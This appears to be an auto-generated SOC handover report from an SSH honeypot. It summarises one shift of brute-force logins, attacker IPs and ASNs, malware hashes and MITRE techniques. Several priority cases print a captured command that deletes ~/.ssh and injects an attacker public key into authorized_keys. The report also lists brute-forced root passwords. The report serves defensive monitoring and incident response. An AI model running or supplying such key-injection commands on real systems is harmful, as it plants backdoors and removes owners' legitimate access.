# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-27 |
| **Generated At** | 2026-04-27T19:29:29Z |
| **Shift Time** | 19:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **34** |
| Confirmed Threats | **28** |
| False Positives Filtered | **6** (17.6%) |
| Unique Attacker IPs | **16** |
| Countries of Origin | **12** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **26** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **14** |
| Unique Credential Pairs | **10** |
| Unique Usernames | **5** |
| Unique Passwords | **10** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 3 |
| `GET / HTTP/1.1` | 1 |
| `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6` | 1 |
| `b'\x05\x04\x00\x01\x02\x80\x05\x01\x00\x03'` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 3 |
| `3245gs5662d34` | 3 |
| `1sanjose` | 1 |
| `Host: 13.235.92.17:23` | 1 |
| `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 3 |
| `root` | `3245gs5662d34` | 3 |
| `root` | `1sanjose` | 1 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 1 |
| `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6` | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `1sanjose` | `211.186.79.173` | 2026-04-27T17:31:16 |
| `root` | `3245gs5662d34` | `211.186.79.173` | 2026-04-27T17:31:20 |
| `root` | `adminopen` | `203.116.129.55` | 2026-04-27T18:06:46 |
| `root` | `3245gs5662d34` | `203.116.129.55` | 2026-04-27T18:06:50 |
| `root` | `tianjing` | `103.106.194.74` | 2026-04-27T18:39:44 |
| `root` | `3245gs5662d34` | `103.106.194.74` | 2026-04-27T18:39:46 |
| `root` | `------fuck------` | `91.134.231.188` | 2026-04-27T19:22:27 |
| `root` | ` ` | `35.200.201.144` | 2026-04-27T19:26:18 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **34** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 11 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 10 | 4 |
| `03a80b21afa8...` | Modern SSH client | 1 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 10 | 4 | libssh-based |
| `03a80b21afa8...` | libssh | 1 | 1 | Modern SSH client |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.106.194.74`, `211.186.79.173`, `203.116.129.55`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **16** |
| Unique ASNs | **13** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 2 | LOW |
| `AS27947` | Telconet S.A | 1 | MEDIUM |
| `AS3215` | Orange S.A. | 1 | LOW |
| `AS16276` | OVH SAS | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS396982` | Google LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-76f48e7ae1eb

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-04-27 17:31 |
| **Last Seen** | 2026-04-27 17:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 17:31:16` | `cowrie.session.connect` |
| `2026-04-27 17:31:16` | `cowrie.client.version` |
| `2026-04-27 17:31:16` | `cowrie.client.kex` |
| `2026-04-27 17:31:16` | `cowrie.login.success` |
| `2026-04-27 17:31:17` | `cowrie.session.params` |
| `2026-04-27 17:31:17` | `cowrie.command.input` |
| `2026-04-27 17:31:17` | `cowrie.command.failed` |
| `2026-04-27 17:31:17` | `cowrie.log.closed` |
| `2026-04-27 17:31:17` | `cowrie.session.params` |
| `2026-04-27 17:31:17` | `cowrie.command.input` |
| `2026-04-27 17:31:17` | `cowrie.session.file_download` |
| `2026-04-27 17:31:17` | `cowrie.log.closed` |
| `2026-04-27 17:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-917744f6f409

| Field | Detail |
|---|---|
| **Source IP** | `211.186.79[.]173` |
| **First Seen** | 2026-04-27 17:31 |
| **Last Seen** | 2026-04-27 17:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 17:31:19` | `cowrie.session.connect` |
| `2026-04-27 17:31:19` | `cowrie.client.version` |
| `2026-04-27 17:31:20` | `cowrie.client.kex` |
| `2026-04-27 17:31:20` | `cowrie.login.success` |
| `2026-04-27 17:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.186.79[.]173` to AbuseIPDB if not already reported
- [ ] Block `211.186.79[.]173` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c995bdf3050

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-04-27 18:06 |
| **Last Seen** | 2026-04-27 18:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 18:06:46` | `cowrie.session.connect` |
| `2026-04-27 18:06:46` | `cowrie.client.version` |
| `2026-04-27 18:06:46` | `cowrie.client.kex` |
| `2026-04-27 18:06:46` | `cowrie.login.success` |
| `2026-04-27 18:06:47` | `cowrie.session.params` |
| `2026-04-27 18:06:47` | `cowrie.command.input` |
| `2026-04-27 18:06:47` | `cowrie.command.failed` |
| `2026-04-27 18:06:47` | `cowrie.log.closed` |
| `2026-04-27 18:06:47` | `cowrie.session.params` |
| `2026-04-27 18:06:47` | `cowrie.command.input` |
| `2026-04-27 18:06:47` | `cowrie.session.file_download` |
| `2026-04-27 18:06:47` | `cowrie.log.closed` |
| `2026-04-27 18:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e83b2bb67846

| Field | Detail |
|---|---|
| **Source IP** | `203.116.129[.]55` |
| **First Seen** | 2026-04-27 18:06 |
| **Last Seen** | 2026-04-27 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 18:06:49` | `cowrie.session.connect` |
| `2026-04-27 18:06:49` | `cowrie.client.version` |
| `2026-04-27 18:06:49` | `cowrie.client.kex` |
| `2026-04-27 18:06:50` | `cowrie.login.success` |
| `2026-04-27 18:06:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.116.129[.]55` to AbuseIPDB if not already reported
- [ ] Block `203.116.129[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cd18dfcaa3b

| Field | Detail |
|---|---|
| **Source IP** | `103.106.194[.]74` |
| **First Seen** | 2026-04-27 18:39 |
| **Last Seen** | 2026-04-27 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 18:39:44` | `cowrie.session.connect` |
| `2026-04-27 18:39:44` | `cowrie.client.version` |
| `2026-04-27 18:39:44` | `cowrie.client.kex` |
| `2026-04-27 18:39:44` | `cowrie.login.success` |
| `2026-04-27 18:39:44` | `cowrie.session.params` |
| `2026-04-27 18:39:44` | `cowrie.command.input` |
| `2026-04-27 18:39:44` | `cowrie.command.failed` |
| `2026-04-27 18:39:44` | `cowrie.log.closed` |
| `2026-04-27 18:39:44` | `cowrie.session.params` |
| `2026-04-27 18:39:44` | `cowrie.command.input` |
| `2026-04-27 18:39:44` | `cowrie.session.file_download` |
| `2026-04-27 18:39:44` | `cowrie.log.closed` |
| `2026-04-27 18:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.106.194[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.106.194[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86bae3e45688

| Field | Detail |
|---|---|
| **Source IP** | `103.106.194[.]74` |
| **First Seen** | 2026-04-27 18:39 |
| **Last Seen** | 2026-04-27 18:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 18:39:45` | `cowrie.session.connect` |
| `2026-04-27 18:39:45` | `cowrie.client.version` |
| `2026-04-27 18:39:45` | `cowrie.client.kex` |
| `2026-04-27 18:39:46` | `cowrie.login.success` |
| `2026-04-27 18:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.106.194[.]74` to AbuseIPDB if not already reported
- [ ] Block `103.106.194[.]74` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-517cc7a9fd52

| Field | Detail |
|---|---|
| **Source IP** | `91.134.231[.]188` |
| **First Seen** | 2026-04-27 19:21 |
| **Last Seen** | 2026-04-27 19:22 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 19:21:41` | `cowrie.session.connect` |
| `2026-04-27 19:21:53` | `cowrie.client.version` |
| `2026-04-27 19:21:53` | `cowrie.client.kex` |
| `2026-04-27 19:22:27` | `cowrie.login.success` |
| `2026-04-27 19:22:38` | `cowrie.session.params` |
| `2026-04-27 19:22:38` | `cowrie.command.input` |
| `2026-04-27 19:22:48` | `cowrie.log.closed` |
| `2026-04-27 19:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.134.231[.]188` to AbuseIPDB if not already reported
- [ ] Block `91.134.231[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d565e20a48e

| Field | Detail |
|---|---|
| **Source IP** | `35.200.201[.]144` |
| **First Seen** | 2026-04-27 19:26 |
| **Last Seen** | 2026-04-27 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-27 19:26:18` | `cowrie.session.connect` |
| `2026-04-27 19:26:18` | `cowrie.client.version` |
| `2026-04-27 19:26:18` | `cowrie.client.kex` |
| `2026-04-27 19:26:18` | `cowrie.login.success` |
| `2026-04-27 19:26:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.200.201[.]144` to AbuseIPDB if not already reported
- [ ] Block `35.200.201[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `118.193.58[.]125` | **9** | 2026-04-27 17:43 | 2026-04-27 17:45 | 2m | 4 | `T1110.001` | 🟢 LOW |
| `20.64.105[.]6` | **2** | 2026-04-27 18:16 | 2026-04-27 18:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.134.231[.]188` | **2** | 2026-04-27 19:21 | 2026-04-27 19:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.106.194[.]74` | 1 | 2026-04-27 18:39 | 2026-04-27 18:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]123` | 1 | 2026-04-27 17:33 | 2026-04-27 17:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.104.93[.]159` | 1 | 2026-04-27 17:52 | 2026-04-27 17:52 | 10s | 0 | `T1592` | 🟢 LOW |
| `20.243.208[.]191` | 1 | 2026-04-27 18:03 | 2026-04-27 18:03 | 11s | 0 | `T1592` | 🟢 LOW |
| `203.116.129[.]55` | 1 | 2026-04-27 18:06 | 2026-04-27 18:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.186.79[.]173` | 1 | 2026-04-27 17:31 | 2026-04-27 17:31 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.177.105[.]82` | 1 | 2026-04-27 17:27 | 2026-04-27 17:27 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `20.243.208[.]191` | JP | Microsoft Corporation | **100** ⚠️ | 8 |
| `35.200.201[.]144` | IN | Google LLC | **100** ⚠️ | 50 |
| `211.186.79[.]173` | KR | SK Broadband Co Ltd | **100** ⚠️ | 22 |
| `172.104.93[.]159` | JP | Linode | **100** ⚠️ | 50 |
| `203.116.129[.]55` | SG | StarHub Internet Pte Ltd | **100** ⚠️ | 50 |
| `20.64.105[.]6` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `91.134.231[.]188` | GB | OVH Ltd | **100** ⚠️ | 3 |
| `103.106.194[.]74` | IN | Elyzium Consulting | **100** ⚠️ | 50 |
| `118.193.58[.]125` | DE | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 0 |
| `14.103.115[.]123` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 13 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 8 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 3 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 5 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 34 cases |
| Tool 34  | Credential Extractor        | ✅ 14 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 16 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (17.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 13 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 8 priority case(s) shown individually · 10 recon entry/entries in table (3 group(s) consolidating 13 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-27T19:29:29Z_
